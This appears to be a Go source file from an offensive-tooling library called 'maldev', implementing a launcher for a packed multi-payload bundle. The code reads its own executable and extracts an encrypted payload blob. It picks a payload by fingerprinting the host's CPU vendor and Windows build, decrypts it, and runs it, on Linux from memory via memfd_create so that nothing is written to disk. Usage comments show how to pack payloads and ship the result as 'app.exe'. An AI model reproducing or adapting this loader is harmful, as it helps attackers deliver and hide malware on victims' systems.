// Command bundle-launcher is the operator-facing runtime for a C6
// multi-target bundle. Build it once, append a bundle blob via
// `packer bundle -wrap` (or [packer.AppendBundle]), and ship the
// resulting single-file executable.
//
// At runtime the launcher:
//
//  1. Reads its own binary via `os.Executable()`.
//  2. Validates the trailing footer (8-byte LE offset + "MLDV-END") via
//     [packer.ExtractBundle].
//  3. Calls [packer.MatchBundleHost] (CPUID vendor + Win build dispatch).
//  4. Decrypts the matched payload via [packer.UnpackBundle].
//  5. Writes plaintext to a memfd_create-backed FD on Linux (zero
//     on-disk artefact) or a temp file on Windows, then execs it.
//
// The launcher exits cleanly when no entry matches and the bundle's
// FallbackBehaviour is BundleFallbackExit.
//
// Usage:
//
//	# Build a generic launcher once:
//	go build -o bundle-launcher ./cmd/bundle-launcher
//
//	# Pack N target binaries into a bundle:
//	packer bundle -out bundle.bin \
//	  -pl payload-w11.exe:intel:22000-99999 \
//	  -pl payload-w10.exe:amd:10000-19999 \
//	  -pl fallback.exe:*:*-*
//
//	# Wrap the bundle into the launcher:
//	packer bundle -wrap bundle-launcher -bundle bundle.bin -out app.exe
//
//	# Ship app.exe — it dispatches at runtime:
//	./app.exe
package main

import (
	"fmt"
	"os"

	"github.com/oioio-space/maldev/pe/packer"
)

func main() {
	exe, err := os.Executable()
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: os.Executable:", err)
		os.Exit(1)
	}
	wrapped, err := os.ReadFile(exe)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: read self:", err)
		os.Exit(1)
	}
	bundle, err := packer.ExtractBundle(wrapped)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: extract:", err)
		os.Exit(1)
	}

	idx, err := packer.MatchBundleHost(bundle)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: match:", err)
		os.Exit(1)
	}
	if idx < 0 {
		// No predicate matched — exit cleanly. The bundle's
		// FallbackBehaviour bit could escalate this; keep simple for
		// now (a real-world deployment can wrap MatchBundleHost +
		// header inspection to honour BundleFallbackCrash etc.).
		return
	}

	plain, err := packer.UnpackBundle(bundle, idx)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: unpack:", err)
		os.Exit(1)
	}

	if err := executePayload(plain, os.Args[1:]); err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: exec:", err)
		os.Exit(1)
	}
}
